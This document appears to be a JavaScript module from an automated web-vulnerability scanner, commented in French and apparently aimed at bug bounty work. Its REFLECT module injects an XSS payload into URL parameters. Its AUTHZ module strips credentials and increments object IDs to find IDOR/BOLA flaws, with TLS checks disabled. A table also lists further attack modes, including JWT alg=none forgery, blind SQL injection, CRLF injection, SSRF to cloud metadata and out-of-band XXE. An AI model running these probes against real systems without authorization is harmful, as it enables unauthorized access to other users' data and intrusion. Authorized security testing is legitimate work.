// ============================================================
// C2FF - modules.js : modules d'attaque a preuve (req + res captures)
//  REFLECT : injection d'un canary dans chaque param, 2e passe si
//            reflechi pour tester l'encodage (<svg> brut = XSS candidat)
//  AUTHZ   : endpoint avec creds vs sans (BOLA non-auth) puis swap d'ID
//            (+1) avec creds (IDOR candidat). Requiert la carte AUTH.
// Regle : un module qui ne capture pas req+res n'existe pas. Severite
//         P2 defendable ou rien : le reste reste SIG/candidat.
// ============================================================
'use strict';
const https = require('https');
const http = require('http');
const { URL } = require('url');

const TIMEOUT = 15000;
const GAP = 400;
const MAX_PARAMS = 8;
const MAX_AUTHZ = 6;
const NOISE = /^__cf|^cf[_-]|_csrf|^csrf|^xsrf|^ray$|^utm_|^fbclid|^gclid|^mc_cid|^mc_eid|^_ga|^ajs_|^amplitude|^sessionid|^sid$|^ref$|^referrer$|^wp-|^note$|^country$/i; // bruit CDN/tracking + params sans valeur de test

function get(url, hdrs, cb) {
  let u; try { u = new URL(url); } catch (e) { return cb(new Error('url invalide'), 0, Buffer.alloc(0)); }
  const mod = u.protocol === 'http:' ? http : https;
  const req = mod.get(url, {
    headers: { 'user-agent': 'Mozilla/5.0 (C2FF-modules)', accept: '*/*', ...(hdrs || {}) },
    timeout: TIMEOUT,
    rejectUnauthorized: false,
  }, r => {
    if ([301, 302, 307, 308].includes(r.statusCode) && r.headers.location) {
      r.resume();
      return get(new URL(r.headers.location, url).toString(), hdrs, cb);
    }
    const chunks = [];
    let n = 0;
    r.on('data', c => { n += c.length; if (n <= 1024 * 1024) chunks.push(c); else r.destroy(); });
    r.on('end', () => cb(null, r.statusCode, Buffer.concat(chunks)));
    r.on('error', e => cb(e, r.statusCode || 0, Buffer.concat(chunks)));
  });
  req.on('timeout', () => req.destroy(new Error('timeout')));
  req.on('error', e => cb(e, 0, Buffer.alloc(0)));
}

function curlOf(url, hdrs) {
  let s = "curl -si '" + url + "'";
  for (const k of Object.keys(hdrs || {})) s += " -H '" + k + ": " + String(hdrs[k]).replace(/'/g, '') + "'";
  return s;
}

function setParam(url, param, val) {
  const i = url.indexOf('?');
  if (i < 0) return url + '?' + param + '=' + encodeURIComponent(val);
  const base = url.slice(0, i), q = url.slice(i + 1);
  const parts = q.split('&');
  for (let k = 0; k < parts.length; k++) {
    if (parts[k].split('=')[0] === param) { parts[k] = param + '=' + encodeURIComponent(val); return base + '?' + parts.join('&'); }
  }
  return base + '?' + q + '&' + param + '=' + encodeURIComponent(val);
}

// couples (param, url-avec-ce-param) tries : les params rares d'abord (plus de chance d'etre logiques)
function paramTargets(params, urls, max) {
  const freq = {};
  for (const p of params || []) if (!NOISE.test(p.p || p)) freq[p.p || p] = p.n || 1;
  const out = [], seenP = new Set();
  for (const u of urls || []) {
    const q = u.split('?')[1];
    if (!q) continue;
    for (const kv of q.split('&')) {
      const i = kv.indexOf('=');
      if (i < 1) continue;
      const p = kv.slice(0, i);
      if (NOISE.test(p) || seenP.has(p)) continue;
      seenP.add(p);
      out.push({ param: p, url: u, n: freq[p] || 0 });
      if (out.length >= max) return out;
    }
  }
  return out;
}

const CANARY = 'q7zc2ffref';
const PAYLOAD = '\'"}><svg/onload=q7z>';

// ---- REFLECT : canary par param, 2e probe si reflechi, preuve = contexte de reponse ----
function reflect(surf, prog, hh, extras, done) {
  const urls = (extras && extras.urls) || [];
  const out = { ts: Date.now(), module: 'REFLECT', host: surf.host || '', checked: [], candidates: [], errs: [] };
  const targets = paramTargets(extras && extras.params, urls, MAX_PARAMS);
  if (!targets.length) { out.errs.push('aucun param testable : lance URLS pour miner les params'); return done(out); }
  let i = 0;
  const next = () => {
    if (i >= targets.length) return done(out);
    const t = targets[i++];
    const u1 = setParam(t.url, t.param, CANARY);
    get(u1, hh, (e, s, b) => {
      if (e || !b) { out.checked.push({ param: t.param, url: t.url.slice(0, 100), status: s, hit: false }); return setTimeout(next, GAP); }
      const body = b.toString('utf8');
      const idx = body.indexOf(CANARY);
      if (idx < 0) {
        out.checked.push({ param: t.param, url: t.url.slice(0, 100), status: s, hit: false });
        return setTimeout(next, GAP);
      }
      // reflechi : 2e probe avec payload pour tester l'encodage
      const u2 = setParam(t.url, t.param, PAYLOAD);
      get(u2, hh, (e2, s2, b2) => {
        const body2 = b2 ? b2.toString('utf8') : '';
        const raw = !e2 && body2.indexOf('<svg/onload=q7z>') >= 0;
        const idx2 = raw ? body2.indexOf('<svg/onload=q7z>') : body2.indexOf('&lt;svg');
        const src = raw ? body2 : body2;
        const at = raw ? idx2 : (body2.indexOf('q7z') >= 0 ? body2.indexOf('q7z') : -1);
        const excerpt = at >= 0 ? src.slice(Math.max(0, at - 70), at + 90).replace(/\s+/g, ' ') : '';
        out.candidates.push({
          param: t.param, url: t.url.slice(0, 160),
          req: curlOf(u2, hh),
          res: { status: s2, len: body2.length, excerpt: excerpt.slice(0, 200) },
          kind: raw ? 'raw' : 'encoded',
          sev: raw ? 'P2' : 'SIG',
        });
        setTimeout(next, GAP);
      });
    });
  };
  next();
}

// ---- AUTHZ : avec/sans creds puis swap d'ID, preuve = les 2 reponses ----
function authz(surf, prog, hhAuth, hhBase, extras, done) {
  const out = { ts: Date.now(), module: 'AUTHZ', host: surf.host || '', checked: [], candidates: [], errs: [] };
  if (!hhAuth.authorization && !hhAuth.cookie) {
    out.errs.push('creds requises : ouvre la carte AUTH, colle tes cookies/Authorization, SAUVER puis relance');
    return done(out);
  }
  const urls = (extras && extras.urls) || [];
  const RX_ID_SEG = /\/(\d{2,})(\/|$|\?)/;
  const RX_ID_PARAM = /[?&](id|uid|user_?id|order_?id|account_?id|customer_?id|profile_?id|doc_?id)=(\d{2,})/i;
  const targets = [];
  const seenT = new Set();
  for (const u of urls) {
    if (!u.includes('?') && !RX_ID_SEG.test(u)) continue;
    const hasId = RX_ID_SEG.test(u) || RX_ID_PARAM.test(u);
    if (!hasId || seenT.has(u)) continue;
    seenT.add(u);
    targets.push(u);
    if (targets.length >= MAX_AUTHZ) break;
  }
  if (!targets.length) { out.errs.push('aucun endpoint avec ID numerique dans l historique : lance URLS d abord'); return done(out); }
  let i = 0;
  const next = () => {
    if (i >= targets.length) return done(out);
    const url = targets[i++];
    const entry = { url: url.slice(0, 160), req: curlOf(url, hhAuth), tests: [] };
    // 1. avec creds (reference)
    get(url, hhAuth, (e1, s1, b1) => {
      const len1 = b1 ? b1.length : 0;
      // 2. sans creds : 200 avec du contenu = endpoint non protege
      get(url, hhBase, (e2, s2, b2) => {
        const len2 = b2 ? b2.length : 0;
        if (!e2 && s2 === 200 && len2 > 0 && len2 >= len1 * 0.5) {
          entry.tests.push({
            kind: 'unauth', sev: 'P2',
            verdict: 'accessible sans authentification',
            req: curlOf(url, hhBase),
            with: { status: s1, len: len1 }, without: { status: s2, len: len2 },
          });
        }
        // 3. swap d'ID (+1) avec creds : 200 + corps different = IDOR candidat
        let swapped = null;
        if (RX_ID_PARAM.test(url)) {
          swapped = url.replace(RX_ID_PARAM, (m, p, v) => m.replace(/=(\d+)/, '=' + (parseInt(v, 10) + 1)));
        } else if (RX_ID_SEG.test(url)) {
          swapped = url.replace(/\/(\d{2,})(?=\/|$|\?)/, m => '/' + (parseInt(m.slice(1), 10) + 1));
        }
        if (swapped && swapped !== url) {
          get(swapped, hhAuth, (e3, s3, b3) => {
            const len3 = b3 ? b3.length : 0;
            if (!e3 && s3 === 200 && Math.abs(len3 - len1) > 32) {
              entry.tests.push({
                kind: 'swap', sev: 'P2',
                verdict: 'ID voisin accessible avec mes creds (IDOR candidat)',
                req: curlOf(swapped, hhAuth),
                with: { status: s1, len: len1 }, without: { status: s3, len: len3 },
              });
            }
            out.checked.push({ url: url.slice(0, 100), tests: entry.tests.length });
            if (entry.tests.length) out.candidates.push(entry);
            setTimeout(next, GAP);
          });
        } else {
          out.checked.push({ url: url.slice(0, 100), tests: entry.tests.length });
          if (entry.tests.length) out.candidates.push(entry);
          setTimeout(next, GAP);
        }
      });
    });
  };
  next();
}

// ============================================================
// MODES AVANCES - 12 identifiants. riskLevel = priorite du
// planificateur (P1 50% / P2 30% / P3 20% du budget du cycle,
// voir fleet.planBudget). cwe = famille CWE dominante.
// L'execution dediee de chaque mode vit dans attack.js (switch EXEC),
// la config dans config.json (bloc advanced_hacks).
// ============================================================
const ADV_MODES = {
  NO_SQLI:       { riskLevel: 'P1', cwe: '943', desc: 'operateurs $ne / $regex injectes dans les params JSON/URL' },
  JWT_ADV:       { riskLevel: 'P1', cwe: '347', desc: 'JWT forge alg=none + kid traversal sur endpoint protege' },
  BLIND_SQL:     { riskLevel: 'P1', cwe: '89',  desc: 'SQLi aveugle temporisee : SLEEP (MySQL) / WAITFOR (MSSQL), latence mesuree' },
  HEADER_INJECT: { riskLevel: 'P2', cwe: '113', desc: 'CRLF (%0d%0a) dans Host / X-Forwarded-For / User-Agent' },
  ACTUATOR_ADV:  { riskLevel: 'P2', cwe: '200', desc: 'actuator Spring exposes : env, heapdump, threaddump' },
  AWS_META:      { riskLevel: 'P2', cwe: '918', desc: 'SSRF vers metadata cloud (AWS / GCP / Azure) via params' },
  OAUTH_MIS:     { riskLevel: 'P2', cwe: '287', desc: 'openid-configuration + implicit flow : access_token dans URL' },
  SESSION_FIX:   { riskLevel: 'P2', cwe: '384', desc: 'fixation de session : cookie sessionid impose' },
  DNS_OOB:       { riskLevel: 'P2', cwe: '918', desc: 'XXE/SSRF out-of-band vers ton domaine OOB (serveur externe requis)' },
  GRAPHQL_INTRO: { riskLevel: 'P3', cwe: '200', desc: 'introspection GraphQL ouverte ({__schema{types{name}}})' },
  VERSION_CRAWL: { riskLevel: 'P3', cwe: '200', desc: 'fichiers de version exposes : /version, /info, /.git/HEAD, /composer.json' },
  DIFF_COMPARE:  { riskLevel: 'P3', cwe: '639', desc: 'differentiel ?id=1 vs ?id=2 contre la baseline cachee (>20% = alerte)' },
};

module.exports = { reflect, authz, paramTargets, CANARY, PAYLOAD, ADV_MODES };